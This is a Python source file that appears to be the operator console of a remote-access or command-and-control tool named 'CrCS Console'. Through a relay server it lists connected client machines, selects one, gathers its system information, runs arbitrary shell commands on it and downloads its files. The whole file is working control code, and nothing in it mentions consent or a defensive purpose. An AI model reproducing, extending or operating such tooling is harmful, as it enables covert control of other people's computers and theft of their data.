import base64
import codecs
import socket
import json
import tqdm
import os

type_info = '\033[22;34m[i]\033[0m '
type_err = '\033[22;31m[-]\033[0m '
type_ok = '\033[22;32m[+]\033[0m '

def multipart_recv(client):
    recv_buf = str()
    key = 'NXT'
    while key == 'NXT':
        json_data = json.loads(client.recv(2048).decode('utf-8'))
        recv_buf += str(base64.b64decode(json_data['content']))[2:-1]
        key = json_data['key']
    for i in range(0,2):
        recv_buf = codecs.escape_decode(recv_buf)[0].decode('utf-8')
    return recv_buf


def multipart_file_recv(client, local_path):
    file_length = 0
    recv_data = client.recv(2048).decode('utf-8')
    print(recv_data)
    head_recv = json.loads(recv_data)
    if head_recv['type'] == 'len':
        file_length = head_recv['content']
    print(type_info + 'Downloading into: ' + local_path + ' , Total blocks: ' + str(file_length))
    with tqdm.tqdm(total=file_length) as pbar:
        pbar.set_description('Downloading:')
        temp_path = local_path + '.tmp'
        with open(temp_path, 'wb') as temp:
            key = 'NXT'
            while key == 'NXT':
                recv_data = client.recv(2048).decode('utf-8')
                json_data = json.loads(recv_data)
                recv_buf = str(base64.b64decode(json_data['content']))[2:-1]
                for i in range(0,2):
                    recv_buf = codecs.escape_decode(recv_buf)[0].decode('utf-8')
                temp.write(recv_buf.encode('utf-8'))
                key = json_data['key']
                pbar.update(1)
    print(type_info + 'Writing file from temp')
    with open(temp_path, 'rb') as temp:
        with open(local_path, 'wb') as local:
            local.write(bytearray.fromhex(codecs.escape_decode(temp.read())[0].decode('utf-8')[2:-1]))
            print(type_ok + 'Succeed in writing file')
    os.remove(temp_path)
    


def openserver(server):
    print('To>', end='')
    try:
        input_str = input()
        server_addr, server_port = input_str.split(':')
        server.connect((server_addr, int(server_port)))
        server.send(json.dumps({ 'type': 'console_chk' }).encode('utf-8'))
        server.settimeout(10)
        recv_data = server.recv(2048).decode('utf-8')
        try:
            json_data = json.loads(recv_data)
            if json_data['type'] == 'accept':
                print(type_ok + 'Connection Activated')
                return (input_str, server)
        except Exception as e:
            print(type_err + 'Response Not in a right format' + str(e))
            server.close()
    except ValueError as e:
        print(type_err + 'Please type a stable address')
    except socket.error as e:
        print(type_err + 'Failed to Connect to ' + input_str + ' - ' + e.strerror)
    except KeyboardInterrupt:
        print('')
        return (None, server)
    except Exception as e:
        print(type_err + 'Server Response Timeout' + e)
        server.close()
    return (None, server)


def getsocketinfo(server):
    if server[0] == None:
        print(type_err + 'Please Connect to server')
    else:
        print(str(server))


def getlist(server):
    if server[0] == None:
        print(type_err + 'Please Connect to server')
    else:
        print(type_info + 'Clients list:')
        server[1].send(json.dumps({'type': 'list'}).encode('utf-8'))
        json_data = json.loads(server[1].recv(2048).decode('utf-8'))
        for key in list(json_data.keys()):
            print(key + ' | ' + json_data[key])


def useclient(server, address):
    if server[0] == None:
        print(type_err + 'Please Connect to server')
    else:
        server[1].send(json.dumps({
            'type': 'use',
            'content': address
        }).encode('utf-8'))
        match json.loads(server[1].recv(2048).decode('utf-8'))['content']:
            case 'exists':
                return address
            case 'notexists':
                print(type_err + 'Client not exists')
                return ''


def getinfo(client, server):
    if client == '':
        print(type_err + 'Please use a client')
    else:
        server.send(json.dumps({'type': 'info', 'content': client}).encode())
        json_data = json.loads(multipart_recv(server)[2:-1])
        print(type_info + 'Machine info of [' + client + ']')
        for key in json_data.keys():
            print(' - \033[22;34m' + key + '\033[0m' + ' : ' + json_data[key])


def execcmd(client, server, command):
    if client == '':
        print(type_err + 'Please use a client')
    else:
        server.send(json.dumps({'type': 'shell', 'client': client, 'content': ' '.join(command)}).encode())
        print(multipart_recv(server)[2:-1])


def fetchfile(client, server, path):
    if client == '':
        print(type_err + 'Please use a client')
    else:
        server.send(json.dumps({'type': 'fetch', 'client': client, 'content': ' '.join(path)}).encode())
        temp_file = os.getcwd() + os.path.sep + os.path.split(' '.join(path))[-1]
        multipart_file_recv(server, temp_file)


def main():
    server_socket = (None, socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM))
    used_client = ''
    while True:
        try:
            print('[' + str(server_socket[0]) + ']' + used_client + '>', end='')
            input_str = input().split(' ')
            match input_str[0]:
                case 'open':
                    server_socket = openserver(server_socket[1])
                case 'socketinfo':
                    getsocketinfo(server_socket)
                case 'list':
                    getlist(server_socket)
                case 'use':
                    used_client = useclient(server_socket, input_str[1])
                case 'info':
                    getinfo(used_client, server_socket[1])
                case 'shell':
                    execcmd(used_client, server_socket[1], input_str[1:])
                case 'fetch':
                    fetchfile(used_client, server_socket[1], input_str[1:])
        except KeyboardInterrupt:
            print()
            print(type_info + 'Exit CrCS Console!')
            server_socket[1].close()
            break
    return


if __name__ == "__main__":
    main()
